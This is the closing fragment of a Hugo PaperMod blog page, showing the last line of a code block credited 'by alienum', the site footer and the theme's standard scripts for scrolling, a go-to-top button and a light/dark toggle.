</span></span><span style=display:flex><span>by alienum with &lt;<span style=color:#ae81ff>3</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>